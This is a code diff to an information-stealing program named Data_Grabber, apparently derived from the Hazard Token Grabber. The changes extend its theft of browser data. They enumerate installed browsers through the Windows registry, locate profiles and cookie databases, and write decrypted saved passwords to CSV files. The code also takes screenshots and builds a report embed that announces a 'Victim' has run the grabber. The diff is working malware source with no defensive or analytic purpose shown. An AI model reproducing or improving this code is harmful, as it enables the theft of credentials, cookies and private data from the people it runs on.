@@ -487,10 +487,18 @@ class Data_Grabber(functions):
         return key
 
     def getChromeCookie(self, path, profile, name):
-        cookiepath = path + os.sep + profile + r"\Network\Cookies"
-        if not os.path.exists(cookiepath):
-            cookiepath = path + os.sep + profile + r"\Cookies"
-
+        if profile == None:
+            cookiepath = path + os.sep + r"\Network\Cookies"
+            if not os.path.exists(cookiepath):
+                cookiepath = path + os.sep + r"\Cookies"
+            if not os.path.exists(cookiepath):
+                return
+        else:
+            cookiepath = path + os.sep + profile + r"\Network\Cookies"
+            if not os.path.exists(cookiepath):
+                cookiepath = path + os.sep + profile + r"\Cookies"
+            if not os.path.exists(cookiepath):
+                return
         sql = f"select * from cookies"
 
         try:
@@ -545,11 +553,25 @@ class Data_Grabber(functions):
             except EnvironmentError:
                 break
 
+        aKey = r"SOFTWARE\Clients\StartMenuInternet"
+        aReg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        browsers = ['Opera', 'Opera GX', 'Vivaldi', 'Chrome',
+                    'Microsoft Edge', 'Uran', 'Yandex', 'Brave', 'Iridium', 'Firefox']
+        aKey = winreg.OpenKey(aReg, aKey)
+
+        for i in range(1024):
+            try:
+                asubkey_name = winreg.EnumKey(aKey, i)
+                if asubkey_name not in userBrowsers:
+                    userBrowsers.append(asubkey_name)
+            except EnvironmentError:
+                break
+
         used = []
-        for digit in range(0, len(userBrowsers)):
-            for digita in range(0, len(browsers)):
-                if browsers[digita] in userBrowsers[digit]:
-                    used.append(browsers[digita])
+        for browser in browsers:
+            for userBrowser in userBrowsers:
+                if browser in userBrowser:
+                    used.append(browser)
 
         return used
 
@@ -570,6 +592,8 @@ class Data_Grabber(functions):
 
     def profiles(self, browser):
         chromeProfiles = []
+        if os.path.exists(self.paths()[browser]) == False:
+            return chromeProfiles
         files = os.listdir(self.paths()[browser])
         was = False
         for num in range(11):
@@ -587,8 +611,12 @@ class Data_Grabber(functions):
         for path in self.browserPaths():
             num += 1
             name = self.without()[num]
-            for profile in self.profiles(name):
-                self.getChromeCookie(path, profile, name)
+            profiles = self.profiles(name)
+            if len(profiles) == 0:
+                self.getChromeCookie(path=path, profile=None, name=name)
+            else:
+                for profile in profiles:
+                    self.getChromeCookie(path, profile, name)
 
     def screenshot(self):
         image = ImageGrab.grab(
@@ -653,6 +681,8 @@ class Data_Grabber(functions):
             CHROME_PATH_LOCAL_STATE = path + '\\Local State'
             global CHROME_PATH
             CHROME_PATH = path
+            if os.path.exists(CHROME_PATH_LOCAL_STATE) == False:
+                continue
             try:
                 with open(self.dir + os.sep + f'{names[num]}_pasw.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                     csv_writer = csv.writer(
@@ -725,7 +755,7 @@ class Data_Grabber(functions):
                 {
                     'author': {
                         'name': f'*{Victim}* Just ran Data Grabber',
-                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
+                        'url': 'https://github.com/Mantelyys/browsers-data-grabber',
                         'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                     },
                     'color': 16119101,
